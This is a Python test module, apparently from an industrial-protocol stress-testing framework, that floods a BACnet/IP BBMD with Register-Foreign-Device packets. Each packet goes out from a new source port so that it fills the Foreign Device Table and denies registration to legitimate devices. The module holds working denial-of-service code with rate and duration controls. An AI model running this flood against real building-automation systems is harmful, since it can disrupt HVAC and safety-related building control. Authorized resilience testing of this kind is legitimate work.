"""
測項：BACnet/IP Foreign Device Registration（BBMD 外部裝置登記表）洪水
分類：BACnet（標準埠 47808/UDP）
說明：BACnet/IP 的 BBMD（BACnet Broadcast Management Device，負責在不同 IP 子網之間
     轉發 BACnet 廣播訊息的閘道角色）會維護一份「Foreign Device Table（FDT，外部裝置
     登記表）」，記錄每個透過 Register-Foreign-Device 註冊進來、要求 BBMD 幫忙轉發廣播
     的外部裝置位址與存活時間（TTL）。這份表的容量在多數 BBMD 實作（無論是嵌入式
     裝置內建，或是商用/開源 BBMD 軟體）上都是有上限的固定大小陣列。本測項持續、
     以受控速率送出合法格式的 Register-Foreign-Device 請求，測試該上限被大量占滿、
     甚至導致合法的外部裝置無法完成註冊（拒絕服務）的行為。

如何讓每筆註冊被視為「不同」的登記（而非同一筆的續約）：Register-Foreign-Device
的 BVLC Payload 本身只有一個 TTL 欄位，並不包含裝置識別碼——BBMD 是以「收到這個
UDP 封包的來源 (IP, Port) tuple」作為 FDT 的識別鍵。因此本測項對每一次註冊都使用一個
全新建立的 UDP socket（不手動 bind 固定來源埠，交由作業系統核配一個新的、真實可用
的臨時來源埠），送出後立即關閉——如此一來，即使來源 IP 都是本機真實 IP（完全沒有
IP/MAC 偽造），BBMD 收到的每一個請求在其視角仍是「來自不同來源埠、因此視為不同外部
裝置」的登記，藉此真正把 FDT 填滿，而不是不斷更新同一筆既有登記的 TTL。這是合法的
來源埠輪替技巧，並非規則第 5 條禁止的「IP/MAC 位址偽造」（來源 IP 從頭到尾都是本機
真實位址，僅來源埠隨作業系統核配而不同）。

安全設計：Register-Foreign-Device 是 BBMD 自身路由/註冊表的維運操作（登記『我這個
外部裝置要加入你的廣播轉發清單』），完全不會送到、也不會變更任何終端裝置（Device
物件、Analog/Binary 等點位）的實際輸出或組態，屬於題目規則第 4 條明確允許的操作。
本測項全程只送出這一種 BVLL 訊息，不夾帶任何 Confirmed/Unconfirmed 服務層 APDU
（Register-Foreign-Device 本身就是純 BVLL 層級的訊息，底下沒有 NPDU/APDU），也不會
送出 Delete-Foreign-Device-Table-Entry 或任何寫入操作。速率透過 RateLimiter 控制，
duration 經 clamp_duration() 限制，只 unicast 送往 Orchestrator 傳入的 target/port
（受測 BBMD）。

BVLC Register-Foreign-Device 封包格式（ASHRAE 135 Annex J.2.4，完全固定、無需
「盡力組出」的部分，信心程度高，非近似值）：
    Byte 0    : 0x81                BVLC Type = BACnet/IP (Annex J)
    Byte 1    : 0x05                BVLC Function = BVLC-Register-Foreign-Device
    Byte 2-3  : 0x00 0x06           BVLC Length（總長度，含本身 4 bytes header），
                                     此訊息固定總長 6 bytes，故固定為 0x0006
    Byte 4-5  : TTL (2 bytes, big-endian, 秒)  Time-To-Live
共 6 bytes，是本協定族中結構最簡單、規格最沒有模糊空間的訊息之一；相較於
read_property_flood.py/DNP3 測項需要組 NPDU/APDU 或資料連結層 CRC 訊框，這裡完全
不需要組出更高層協定結構，格式正確性的信心程度相對最高。

重要限制：
  - 若 target 並非真正的 BBMD（只是一般 BACnet 裝置、未啟用 BBMD 角色），對方通常會
    直接忽略此訊息或回覆 BVLC-Result 帶錯誤碼（例如 0x0060 = Register-Foreign-Device
    NAK），這是正常現象，代表受測裝置沒有可被此測項耗盡的 FDT 資源，並不代表測項
    本身有誤；請先確認受測目標確實是 BBMD 角色。
  - BBMD 實際保留登記的時間通常是 TTL + 30 秒的寬限期（ASHRAE 135 規定：「實際失效
    時間應比宣告的 TTL 多 30 秒」），本測項不主動送出取消註冊，測試結束後 FDT 內殘留
    的登記會依此規則自然到期，測試人員應知悉此行為並自行評估對受測 BBMD 的後續影響。
  - 由於每筆註冊都會建立一個新的 UDP socket（送出後立即關閉，不保留），在高速率、
    長時間執行下攻擊端會快速地開關大量 socket；UDP 沒有 TCP 的 TIME_WAIT 問題，
    關閉後臨時來源埠可立即被作業系統回收再利用，不會造成攻擊端資源耗盡。
需求：無額外套件，純標準函式庫。
"""
import socket
import time

from ..common import RateLimiter, clamp_duration

NAME = "BACnet BBMD Foreign Device Registration 登記表洪水"
CATEGORY = "BACnet"
PROTOCOL = "UDP"
DEFAULT_PORT = 47808
TEST_TYPE = "resource"  # 資源型：耗用 BBMD 有上限的 Foreign Device Table（FDT）資源

_BVLC_FUNC_REGISTER_FOREIGN_DEVICE = 0x05


def _build_register_foreign_device(ttl_sec: int) -> bytes:
    ttl_sec = max(0, min(int(ttl_sec), 0xFFFF))
    return bytes([0x81, _BVLC_FUNC_REGISTER_FOREIGN_DEVICE, 0x00, 0x06]) + ttl_sec.to_bytes(2, "big")


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 90000, "min": 1, "max": 90000, "desc": "每秒送出 Register-Foreign-Device 請求數（每筆使用全新來源埠，視為不同外部裝置登記）"},
        "ttl_sec": {"type": "int", "default": 3600, "min": 1, "max": 65535, "desc": "登記存活時間（秒）；BBMD 通常會多保留 30 秒寬限期，愈長則占用 FDT 資源的時間愈久"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 200))
    ttl_sec = int(params.get("ttl_sec", 3600))

    pkt = _build_register_foreign_device(ttl_sec)
    limiter = RateLimiter(rate)
    sent, errors = 0, 0
    start = time.time()

    log_fn(f"[+] BACnet BBMD Foreign Device Registration 洪水 -> {target}:{port} @ {rate}/s，ttl={ttl_sec}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            # 每筆登記各自開一個新 socket（不 bind 固定埠，交由 OS 核配新的來源埠），
            # 送出後立即關閉：讓 BBMD 視角看到的來源 (IP, Port) 每筆都不同，
            # 才能真正填滿 FDT，而不是持續更新同一筆既有登記，詳見本檔案 docstring。
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.sendto(pkt, (target, port))
                sent += 1
            finally:
                s.close()
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")

    return {
        "registrations_sent": sent,
        "errors": errors,
        "elapsed_sec": round(time.time() - start, 1),
    }
